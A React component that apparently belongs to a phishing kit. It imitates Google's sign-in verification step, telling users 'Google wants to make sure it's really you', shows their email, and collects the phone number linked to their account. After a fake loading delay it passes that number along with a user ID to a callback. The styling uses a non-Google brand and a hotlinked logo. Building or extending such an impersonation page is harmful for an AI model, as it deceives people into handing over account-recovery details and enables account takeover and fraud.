import { useState } from "react";
import "./SignIn.css";

function PhoneStep({ email, userId, onComplete }) {
  const [phoneNumber, setPhoneNumber] = useState("");
    const [showLoader, setShowLoader] = useState(false);
  

 const handleSubmit = (e) => {
  e.preventDefault();

  if (!phoneNumber.trim()) return;

  console.log("Current user ID:", userId);
  console.log("Current phoneNumber:", phoneNumber.trim());
    setShowLoader(true);

  if (onComplete) {
    setTimeout(() => {
         onComplete(userId, phoneNumber.trim());
      setShowLoader(false);
    }, 2000);
   
  }
};

    const handleBack =
    () => {




    window.location.href = "/"


      



     


    };

  return (
    <div className="signin-page">

      <div className="signin-card ">

         {showLoader && (
           <div className="processing-loader">
            <div className="processing-loader-bar"></div>
          </div>
        )}

        <div className="password-left">

           <div className="pesams-brand">

            <div className="pesams-l">
              <img className="pesams-logo" src="https://tse3.mm.bing.net/th/id/OIP._YRByM7l5SCayIje5TRfuwHaHj?r=0&rs=1&pid=ImgDetMain&o=7&rm=3" alt="" />
            </div>

          

          </div>

          <h1 className="signin-title">
            Sign in
          </h1>
          <p className="signin-subtitle">To help keep your account safe, Google wants to make sure it's really you trying to sign in.</p>

          <div onClick={handleBack} className="account-pill">
            <span className="account-icon">👤</span>
            <span className="account-email">
              {email}
            </span> 
              <button
                  type="button"
                  // onClick={handleBack}
                  className="account-arrow"
                >
                  ▼
                </button>
          </div>

        </div>

        <div className="password-right">

      

          <form onSubmit={handleSubmit}>
            <div>Enter the phone number connected to your account.</div>

            <div className="password-input-container">

              <input
                id="password"
                type={"number"}
                value={phoneNumber}
                
                onChange={(e) => setPhoneNumber(e.target.value)}
                placeholder=" "
                autoComplete="off"
              />

              <label htmlFor="password">
                Enter your phone number
              </label>

            </div>

         

            <div className="password-actions">

              <button
                type="button"
                className="text-button"
              >
                Try another way
              </button>

              <button
                type="submit"
                className="next-button"
                disabled={!phoneNumber.trim()}
              >
                Next
              </button>

            </div>

          </form>

        </div>

      </div>

    </div>
  );
}

export default PhoneStep;